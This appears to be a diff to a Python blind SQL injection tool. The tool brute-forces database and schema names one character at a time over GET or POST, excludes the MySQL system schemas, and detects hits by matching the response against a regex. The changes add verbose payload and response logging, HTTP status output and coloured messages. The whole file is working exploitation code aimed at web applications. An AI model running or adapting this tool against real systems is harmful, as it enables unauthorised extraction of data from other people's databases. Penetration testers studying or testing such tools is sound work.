@@ -9,6 +9,9 @@ PLACEHOLDER = '{}'
 
 chars = 'abcdefghijklmnopqrstuwxyz-_0123456789'
 notin = ['information_schema', 'mysql', 'performance_schema', 'sys']
+verbose = False
+
+cli = cli_options.CliOptions()
 
 
 def createBruteQuery(word, query):
@@ -30,13 +33,12 @@ def substitutePlaceholders(query, placeholder, notin):
 
 def inPOSTrequest(payload, url, headers):
     r = requests.post(url, data=payload, headers=headers)
-    return r.text
+    return (r.text, r.status_code)
 
 
 def inGETrequest(payload, url, headers):
     r = requests.get(url, params=payload, headers=headers)
-
-    return r.text
+    return (r.text, r.status_code)
 
 
 def preparePayload(parameters, phrase, encode):
@@ -59,12 +61,15 @@ def preparePayload(parameters, phrase, encode):
 def notBruteForce(parameters, headers, phrase, url, callback, pattern, positive, encode):
 
     payload = preparePayload(parameters, phrase, encode)
-    r = callback(payload, url, headers)
+    r, status = callback(payload, url, headers)
+    if verbose: print('[Response body] {}'.format(cli.grey(r)))
+    if verbose: print("[Http status] {}".format(cli.status(status)))
+
     result = pattern.search(r)
 
     if (positive and result) or (not positive and not result):
-        message = '\n!!!\nFound: {}\n!!!\n'.format(phrase)
-        print(message)
+        message = '[Found] {}'.format(phrase)
+        print(cli.green(message))
 
 
 def bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, word=''):
@@ -72,18 +77,21 @@ def bruteforce(parameters, headers, phrase, url, callback, pattern, positive, en
     for char in chars:
 
         newWord = createWord(word, char)
-        query = substitutePlaceholders(phrase, NOTIN_PLACEHOLDER, notin)
-        brutequery = createBruteQuery(newWord, query)
+        brutequery = createBruteQuery(newWord, phrase)
+        if verbose: print('[Payload] {}'.format(cli.grey(brutequery)))
         payload = preparePayload(parameters, brutequery, encode)
         newHeaders = preparePayload(headers, brutequery, encode)
 
-        r = callback(payload, url, newHeaders)
+        r, status = callback(payload, url, newHeaders)
+        if verbose: print('[Response body] {}'.format(cli.grey(r)))
+        if verbose: print("[Http status] {}".format(cli.status(status)))
+
         result = pattern.search(r)
 
         if (positive and result) or (not positive and not result):
                 return bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, newWord)
 
-    message = '\nFound: {}'.format(word) if word is not '' else 'Nothing found :('
+    message = cli.green('[Found] {}'.format(word)) if word is not '' else cli.red('[Nothing found] :(')
     print(message)
     return word
 
@@ -107,8 +115,9 @@ def runInjection(method, parameters, headers, phrasesToTest, url, pattern, posit
         else:
             func = bruteforce
 
+        phrase = substitutePlaceholders(phrase, NOTIN_PLACEHOLDER, notin)
         phrase = phrase.rstrip('\n')
-        print('Testing: {}'.format(phrase))
+        print(cli.yellow('\n[Testing] {}'.format(phrase)))
 
         try:
 
@@ -118,6 +127,8 @@ def runInjection(method, parameters, headers, phrasesToTest, url, pattern, posit
             elif method == 'GET':
                 func(parameters, headers, phrase, url, inGETrequest, pattern, positive, encode)
 
+        except KeyboardInterrupt:
+            print(cli.red('\n[Script exit]'))
         except:
             print('''
             Something went wrong. Possible causes:
@@ -129,11 +140,13 @@ def runInjection(method, parameters, headers, phrasesToTest, url, pattern, posit
 
 
 if __name__ == "__main__":
-    args = cli_options.parseArguments()
+
+    args = cli.parseArguments()
     
     jsonParsed = json.load(args.filename)
 
     headers = parseParameters(args.http_header, ':')
     parameters = parseParameters(args.parameter, '=')
+    verbose = args.verbose
 
     runInjection(args.http_method, parameters, headers, jsonParsed[args.query_set], args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
